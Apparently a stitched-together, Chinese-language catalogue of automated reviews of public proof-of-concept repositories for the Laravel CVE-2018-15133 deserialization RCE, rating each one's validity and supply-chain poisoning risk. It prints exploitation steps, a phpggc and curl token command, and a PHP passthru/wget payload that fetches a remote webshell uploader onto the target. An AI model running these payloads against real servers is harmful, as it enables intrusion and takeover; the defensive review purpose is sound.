*   **依赖外部资源：** `cve.php` 依赖于 `phpggc` 工具，如果 `phpggc` 被篡改，可能会引入恶意代码。风险相对较低，因为 `phpggc` 是一个广泛使用的工具，被篡改的可能性较低。但是仍需确认。
*   **shell_exec函数滥用风险：** `cve.php` 中多次使用了 `shell_exec` 函数，包括执行 `phpggc` 命令和 `curl` 命令。如果攻击者可以控制这些命令的参数，就可能执行任意系统命令。由于 `cve.php` 需要用户提供 APP_KEY 和目标 URL，并且有 payload 参数，存在用户误用的情况，比如直接使用了恶意payload。
*   **README.md文件：**此文件是正常的说明文档，没有发现投毒内容。
*   **phpggc:** 本身作为一个payload生成器，其本身不应该作为投毒风险考虑，而是应该考虑其生成payload的安全性。

考虑到以上因素，评估此仓库的投毒风险为 10%。 风险主要集中在用户误用，或者`phpggc`工具被篡改的可能性。

**项目地址:** [bukitbarisan/laravel-rce-cve-2018-15133](https://github.com/bukitbarisan/laravel-rce-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #11

**来源**: [CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md](../2018/CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework Token Unserialize RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常需要之前已经获得的特权访问或成功利用了之前的漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133 漏洞是 Laravel Framework 中由于对 X-XSRF-TOKEN 值进行不安全的反序列化操作导致的远程代码执行漏洞。攻击者可以通过伪造恶意的 X-XSRF-TOKEN，并将其加密后发送给服务器，服务器在解密并反序列化该 token 时，会执行攻击者预先设定的恶意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞的 POC 代码是有效的。搜索引擎结果中包含了多个指向该漏洞的详细描述、利用代码示例以及缓解措施的文章，包括 CISA 将其添加到已知被利用的漏洞目录中。
提供的 Dockerfile 文件和 README.md 文件描述了如何搭建一个存在漏洞的 Laravel 环境并利用 `cve-2018-15133.php` 脚本进行攻击。README.md 中给出了详细的利用步骤，包括获取 APP_KEY，生成反序列化 Payload，加密 Payload，最后通过 POST 请求发送 Payload。脚本通过构造特定的 PHP 对象，在反序列化时触发 `system()` 函数来执行任意命令。

**投毒风险：**
Dockerfile文件用于构建一个包含漏洞版本的Laravel应用的Docker镜像。 cve-2018-15133.php 用于漏洞利用，并没有发现可疑或恶意行为，因此投毒风险较低。

代码仓库中主要为演示漏洞利用的代码，并无发现存在恶意行为或后门的代码。`phpggc` 用于生成payload，但其本身不是由该作者提供的,所以此处不做分析。Dockerfile 安装的是已知漏洞版本的 Laravel，用于复现，而不是植入后门，所以投毒可能性较低。 投毒风险较低，大约在1%以下。

**利用方式：**
1.  **获取 APP_KEY：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。通常，这需要攻击者已经获得了服务器的某些权限，例如读取 `.env` 文件的权限。可以通过`docker exec -it $(docker ps --latest --quiet) grep -e ^APP_KEY /var/www/html/laravel/.env`来获取，这说明需要一定的权限才能获取该KEY，这使得利用难度增大。
2.  **生成反序列化 Payload：** 攻击者使用 `phpggc` 工具（或类似工具）生成一个恶意 PHP 反序列化 Payload。该 Payload 包含一个精心构造的对象链，当被反序列化时，会执行任意命令。 例如，`phpggc Laravel/RCE1 'uname -a' -b`。
3.  **加密 Payload：** 使用 Laravel 的加密机制（`Illuminate\Encryption\Encrypter`）以及 APP_KEY 对 Payload 进行加密，生成一个类似于 Laravel XSRF-TOKEN 的字符串。这通过 cve-2018-15133.php 进行
4.  **发送 Payload：** 将加密后的 Payload 放在 `X-XSRF-TOKEN` HTTP header 中，发送一个 POST 请求到存在漏洞的 Laravel 应用。 例如：`curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI`
5.  **触发 RCE：** Laravel 应用在处理请求时，会解密并反序列化 `X-XSRF-TOKEN` 的值。由于 Payload 是恶意的，反序列化过程会触发远程代码执行，导致服务器执行攻击者预先设定的命令。


**项目地址:** [kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #12

**来源**: [CVE-2018-15133-pwnedshell_Larascript.md](../2018/CVE-2018-15133-pwnedshell_Larascript.md)

# CVE-2018-15133

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-15133-0xSalle_cve-2018-15133.md](../2018/CVE-2018-15133-0xSalle_cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行和服务器被完全控制

**影响版本:** 5.5.40 及之前版本，5.6.x 版本直至 5.6.29

**利用条件:** 需要知道 Laravel 应用的 APP_KEY，通常情况下无法获取，但如果攻击者之前拥有过特权访问权限或成功完成了之前的攻击，则可能获取到。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，攻击者可以通过在 X-XSRF-TOKEN 值上进行未授权的反序列化操作，导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 的 gadgetchains/Laravel/RCE/3/chain.php 中。利用该漏洞需要知道 Laravel 应用的 APP_KEY，并通过精心构造的序列化数据，触发特定的 PHP 对象链（gadget chain）执行任意代码。

**有效性：**
提供的 POC 代码看起来是有效的，因为它实现了以下功能：
1.  生成恶意 payload：根据指定的命令、API 密钥和 payload 方法，生成反序列化 payload。
2.  加密 payload：使用 Laravel 应用的 APP_KEY 对 payload 进行 AES 加密，并生成相应的 IV 和 MAC 值。
3.  发送 payload：将加密后的 payload 设置到 X-XSRF-TOKEN cookie 中，并发送请求到 Laravel 应用。

**投毒风险：**
该代码仓库中存在一定的投毒风险，大约为10%。风险主要体现在以下几个方面：
1.  **潜在的后门代码：** 即使表面上代码实现了漏洞利用的功能，但攻击者可能在代码中隐藏一些恶意的后门，例如：
    *   在生成 payload 的过程中，插入额外的恶意代码。
    *   在请求发送过程中，记录或泄露敏感信息。
    *   利用漏洞在目标服务器上部署持久化后门。
2.  **依赖风险：** 该 POC 代码可能依赖于一些外部库或模块，这些库或模块本身可能存在安全漏洞或恶意代码。
3.  **不完善的错误处理：** 代码中的错误处理可能不够完善，导致程序在特定情况下崩溃或产生其他安全问题。

**利用方式：**
利用方式如下：
1.  **获取 APP_KEY：** 首先需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步，可能需要通过其他漏洞或社会工程学手段获取。
2.  **生成 Payload：** 使用 POC 代码生成包含恶意命令的 payload。POC 允许选择不同的 payload 方法（Laravel RCE1, RCE2, RCE3, RCE4），选择合适的 payload 方法可能取决于目标环境的配置。
3.  **加密 Payload：** 使用 APP_KEY 对生成的 payload 进行加密，并计算 MAC 值。
4.  **发送请求：** 将加密后的 payload 作为 X-XSRF-TOKEN cookie 的值发送到目标 Laravel 应用。
5.  **触发反序列化：** Laravel 应用在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 的值，从而触发漏洞，执行恶意代码。

**项目地址:** [0xSalle/cve-2018-15133](https://github.com/0xSalle/cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #2

**来源**: [CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md](../2018/CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行，完全控制服务器

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，可以通过其他漏洞获取或之前已获得特权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 5.5.40 及之前版本，以及 5.6.x 系列的 5.6.29 及之前版本中。攻击者可以通过在 X-XSRF-TOKEN 中发送恶意序列化数据，利用 `unserialize` 函数执行任意代码。利用链涉及 `Illuminate/Encryption/Encrypter.php` 的 decrypt 方法以及 phpggc 中的 `PendingBroadcast` gadget chain。攻击的先决条件是攻击者需要知道 Laravel 应用的 `APP_KEY`，这通常很难，但可以通过信息泄露漏洞或其他攻击获得。提供的 PoC 代码包含一个 bash 脚本 `betterpoc.sh` 用于自动化利用，以及一个 PHP 脚本 `cve-2018-15133.php` 用于生成恶意 X-XSRF-TOKEN。`betterpoc.sh` 脚本通过调用 `phpggc` 生成反序列化 payload，然后使用 `cve-2018-15133.php` 脚本利用 APP_KEY 加密 payload，最终通过 curl 发送包含恶意 token 的 POST 请求。投毒风险分析：尽管 PoC 代码主要用于漏洞验证，自动化脚本存在轻微风险，例如通过修改命令注入后门，该风险较低，约10%，因需要使用者进行配置，且代码清晰可见。利用方式总结：1. 获取目标 Laravel 应用的 APP_KEY。2. 使用 phpggc 生成执行任意命令的反序列化 payload。3. 使用 cve-2018-15133.php 脚本，利用 APP_KEY 加密 payload 生成 X-XSRF-TOKEN。4. 发送包含恶意 X-XSRF-TOKEN 的 POST 请求到目标服务器。

**项目地址:** [AlienX2001/better-poc-for-CVE-2018-15133](https://github.com/AlienX2001/better-poc-for-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #3

**来源**: [CVE-2018-15133-AzhariKun_CVE-2018-15133.md](../2018/CVE-2018-15133-AzhariKun_CVE-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，并且目标存在未升级的Laravel框架漏洞版本。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞，攻击者通过在X-XSRF-TOKEN中注入恶意序列化数据，并利用`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法进行解密时触发反序列化操作，从而执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码利用了该漏洞，通过上传包含恶意payload的XSRF-TOKEN，理论上是有效的。该代码首先尝试从`.env`文件中获取`APP_KEY`，然后将目标站点和`APP_KEY`发送到 `http://exploit.anons79.com/`，进行后续处理。GitHub上也有公开的利用代码，可以辅助验证漏洞。

**投毒风险：**
POC 代码存在一定的投毒风险。

1.  **依赖外部网站**：POC 代码向 `http://exploit.anons79.com/` 发送数据。如果这个网站被攻陷或者被作者控制，可能被植入恶意代码。所以具有一定的风险。
2.  **未知的恶意行为**：`http://exploit.anons79.com/` 站点的行为是不透明的。虽然POC声称是自动上传shell,但实际实现可能包含未知的恶意行为，例如：收集目标信息，植入更深层次的后门。
3.  **`.env` 文件泄露**:  直接尝试从 `.env` 文件中读取 `APP_KEY` 存在风险，可能导致敏感信息泄露。

综合来看，投毒风险大概在20%左右。

**利用方式：**
1.  **获取APP_KEY：** 攻击者首先需要获取Laravel应用的APP_KEY。这可以通过多种方式实现，例如：
    *   直接读取.env文件（如果配置不当允许访问）。
    *   通过其他漏洞（如文件包含、SQL注入等）获取。
    *   猜测或者暴力破解（难度较高）。
2.  **构造恶意payload：** 攻击者使用phpggc等工具，根据已知的gadget chain构造恶意的序列化payload。
3.  **加密payload：** 使用APP_KEY和Laravel的加密算法对payload进行加密。
4.  **发送请求：** 将加密后的payload作为X-XSRF-TOKEN的值，发送到目标Laravel应用。
5.  **触发反序列化：** 当Laravel应用处理请求时，会解密X-XSRF-TOKEN，从而触发反序列化操作，最终执行payload中的恶意代码，实现远程代码执行。

**项目地址:** [AzhariKun/CVE-2018-15133](https://github.com/AzhariKun/CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #4

**来源**: [CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #5

**来源**: [CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md](../2018/CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中，是由于对 X-XSRF-TOKEN 值进行 unserialize 调用时，可能导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 中。攻击者必须知道应用程序密钥（APP_KEY），通常这是不可能发生的，除非攻击者先前拥有特权访问权限或成功完成了之前的攻击。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步。
2.  攻击者使用 phpggc (或类似工具) 生成一个恶意的 PHP 对象序列化字符串，该字符串利用了 Laravel 框架中的反序列化漏洞链（例如，PendingBroadcast 和相关的 gadget chain）。
3.  该序列化字符串被加密并编码，然后设置为 X-XSRF-TOKEN cookie 的值。
4.  当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN cookie 时，恶意的对象链会被触发，导致远程代码执行。

**POC有效性：**

提供的 POC 代码利用了 CVE-2018-15133 漏洞。代码中包含了生成加密数据，设置 X-XSRF-TOKEN cookie，以及发送请求的代码。给定的命令可以通过反序列化执行。

**投毒风险：**

查看`exploit.go`后，发现代码的主要功能是生成恶意序列化数据，加密数据，以及发送HTTP请求。该`exploit.go`文件代码量较少,功能明确,没有发现明显的恶意代码。
README.md 文档描述了漏洞利用的步骤和所需的环境。其中提到需要下载并运行 Docker 镜像 `kozmico/laravel-poc-cve-2018-15133`。 虽然该 Docker 镜像本身不是本次评估的一部分，但是如果该镜像中包含恶意代码，则可能会导致投毒攻击。该镜像的安全性需要单独评估。此外，该README建议使用 kali linux 虚拟机进行攻击。说明攻击环境搭建比较复杂。总的来说，此仓库存在一定的投毒风险，但主要风险来源于引用的 Docker 镜像，而非提供的Go代码。根据评估，代码本身存在投毒的概率较低，大约在10%。

**项目地址:** [Cr4zyD14m0nd137/Lab-for-cve-2018-15133](https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #6

**来源**: [CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md](../2018/CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md)

## CVE-2018-15133-Laravel框架-反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，通过X-XSRF-TOKEN传递恶意payload。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133漏洞存在于Laravel Framework的5.5.40及之前版本，以及5.6.x到5.6.29版本。该漏洞是由于对X-XSRF-TOKEN值进行unserialize调用时，未对数据进行充分验证，导致远程代码执行。攻击者需要知道APP_KEY才能成功利用此漏洞。这个APP_KEY通常不会被泄露，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能发生。

**漏洞利用方式：**

1.  攻击者获取Laravel应用的APP_KEY（例如，通过源代码泄露、环境变量泄露等）。
2.  攻击者使用phpggc生成包含恶意代码的PHP序列化payload。POC中使用了`Laravel/RCE5` gadget chain，该gadget chain允许执行任意系统命令。
3.  攻击者使用APP_KEY加密该payload，并将其设置为X-XSRF-TOKEN cookie的值。
4.  攻击者向目标Laravel应用发送包含该cookie的HTTP请求。
5.  Laravel应用解密cookie值，然后反序列化payload，执行恶意代码。

**漏洞利用有效性：**

提供的PoC代码是有效的，因为它实现了上述漏洞利用过程。该脚本使用phpggc生成payload，然后使用APP_KEY对其进行加密，并发送包含该加密payload的HTTP请求。

**投毒风险：**

该代码的投毒风险极低。原因如下：

*   代码量较少，逻辑清晰，主要功能是利用已知的反序列化漏洞。
*   代码使用了subprocess调用外部程序phpggc，如果phpggc本身被篡改，则可能引入风险，但该风险不在本代码的范围内。
*   代码中没有发现任何尝试连接外部服务器或执行其他恶意操作的迹象。
*  由于脚本依赖phpggc来生成payload, 因此如果phpggc被替换成了恶意版本,可能会存在被投毒的风险. 但本脚本本身只是对phpggc的调用,不具备投毒的特性. 如果不考虑第三方依赖的风险, 代码投毒风险评估为1%.

**项目地址:** [Loaxert/CVE-2018-15133-PoC](https://github.com/Loaxert/CVE-2018-15133-PoC)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #7

**来源**: [CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md](../2018/CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md)

## CVE-2018-15133-Laravel-反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道 Laravel 应用的 application key

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 是 Laravel 框架中的一个反序列化漏洞，存在于 5.5.40 及之前的版本，以及 5.6.x 系列的 5.6.29 及之前的版本。该漏洞源于对 X-XSRF-TOKEN 值的不可信反序列化调用，攻击者可以通过构造恶意的序列化数据，并将其作为 X-XSRF-TOKEN 的值发送到服务器，从而触发远程代码执行。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 application key。这通常是利用此漏洞最困难的部分。攻击者可能通过先前获取的权限或信息泄露来获得此密钥。
2.  攻击者使用 phpggc 等工具，基于 PendingBroadcast gadget chain 生成恶意的序列化 payload。
3.  攻击者使用 application key 对 payload 进行加密，并生成相应的 X-XSRF-TOKEN 值。
4.  攻击者将构造的 X-XSRF-TOKEN 值添加到 HTTP 请求头中，并发送到目标 Laravel 应用。
5.  服务器在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 值，从而触发 payload 中的恶意代码，最终实现远程代码执行。

**有效性：**

根据漏洞信息、搜索结果和提供的 POC 代码，可以判断该漏洞利用是有效的。搜索结果中提供了多个关于此漏洞的描述和利用的链接，包括 NVD、CISA 的已知被利用漏洞目录以及 GitHub 上的 POC 代码仓库。

提供的 POC 代码 (main.cpp) 看起来是一个 C++ 编写的漏洞利用程序，它实现了以下功能：

*   接受 URL、命令和 application key 作为参数。
*   生成恶意的 X-XSRF-TOKEN 值。
*   发送带有构造的 X-XSRF-TOKEN 值的 HTTP 请求到目标 URL。

该 POC 代码使用了 OpenSSL 库进行 AES 加密和 HMAC 计算，并且使用了 Base64 编码。  代码逻辑与漏洞描述一致，即利用已知的 application key，构造恶意payload，经过加密、编码后，作为 X-XSRF-TOKEN 发送，从而触发反序列化漏洞。

**投毒风险：**

该 POC 代码主要由 `main.cpp` 和 `build.sh` 构成。`build.sh` 负责编译 `main.cpp`。`main.cpp` 代码量相对较大，人工review 存在疏漏的可能。以下是我对投毒风险的分析：

*   **正面因素：** 代码逻辑主要集中在实现漏洞利用上，包括参数解析、payload 生成、加密、编码、HTTP 请求发送等。没有发现明显的恶意代码或后门。
*   **负面因素：**  代码使用了第三方库 OpenSSL，并且包含一些字符串处理和内存管理操作，这些地方可能存在安全漏洞。例如，如果代码没有正确处理字符串长度，可能会导致缓冲区溢出。
*   **潜在风险：** 攻击者可能通过修改 `build.sh` 添加额外的编译选项，例如链接恶意库，从而植入后门。但是，提供的 `build.sh` 文件比较简单，只包含编译命令，没有发现任何可疑操作。

综合来看，该仓库中存在作者隐藏的投毒代码的可能性较低，大概在5%左右。主要风险在于代码中可能存在的潜在安全漏洞，以及编译过程中可能被利用的风险。

**项目地址:** [NatteeSetobol/CVE-2018-15133-Lavel-Expliot](https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #8

**来源**: [CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md](../2018/CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 5.5.x <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，通过 X-XSRF-TOKEN 传递恶意序列化数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 漏洞是 Laravel 框架中由于对 X-XSRF-TOKEN 值的反序列化操作不当导致的远程代码执行漏洞。攻击者可以构造恶意的序列化数据，通过 X-XSRF-TOKEN 头部发送给服务器，服务器在解密和反序列化该数据时，执行攻击者预先设定的恶意代码。漏洞利用的关键在于需要知道 Laravel 应用的 APP_KEY，才能成功加密和构造恶意数据。搜索结果表明该漏洞已被CISA列入已知被利用的漏洞目录。

提供的漏洞利用代码 `rce.sh` 通过访问 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 接口，利用该接口执行PHP代码的特性，尝试上传一个PHP Webshell（uploader.php）。虽然脚本本身的功能是上传webshell，但脚本并不会主动植入恶意后门,所以判定投毒风险为0%。 脚本的原理是利用 phpunit 的 eval-stdin.php 文件, 该文件可以执行POST请求中的PHP代码, 从而进行webshell上传。 这种利用方式依赖于目标环境存在phpunit且eval-stdin.php文件存在且可访问。

**项目地址:** [Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader](https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #9

**来源**: [CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md](../2018/CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 and 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，这通常需要事先获得了特权访问权限或成功实施了先前的攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞。攻击者可以利用此漏洞，通过在X-XSRF-TOKEN中注入恶意序列化数据，实现在目标服务器上执行任意代码。漏洞利用的核心在于`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法和`phpggc`中的`gadgetchains/Laravel/RCE/3/chain.php`。

**有效性：**

从漏洞描述和搜索结果来看，此漏洞已经被CISA列入已知被利用的漏洞目录，表明该漏洞在野外被积极利用。提供的PoC代码基于已知的利用方式，并参考了 Metasploit 的 exploit，所以该PoC代码有效。

**投毒风险：**

PoC代码主要由两个文件组成：`README.md` 和 `pwn_laravel.py`。

*   `README.md`: 包含漏洞描述、利用方法、依赖安装和免责声明等信息。没有发现恶意代码。
*   `pwn_laravel.py`: PoC利用脚本，用于生成恶意payload并发送到目标服务器。脚本利用了`Crypto`库进行加密和解密操作。虽然代码功能是实现RCE，但本身逻辑并没有发现明显的投毒行为。

分析后认为，投毒风险主要存在于依赖项上，尤其是`Crypto`库。但是由于该库比较常用，如果存在恶意代码，可能会被更早发现。

根据代码的功能和依赖关系，判定投毒风险为10%。

**利用方式：**

1.  **获取APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要获取目标Laravel应用的APP_KEY。APP_KEY通常存储在`.env`文件中。
2.  **生成恶意Payload：** 使用PoC脚本`pwn_laravel.py`，指定目标URL、APP_KEY和要执行的命令，生成恶意的序列化数据，并使用APP_KEY对其进行加密。
3.  **发送请求：** 将生成的加密数据作为`X-XSRF-TOKEN`的值，通过HTTP请求发送到目标Laravel应用。
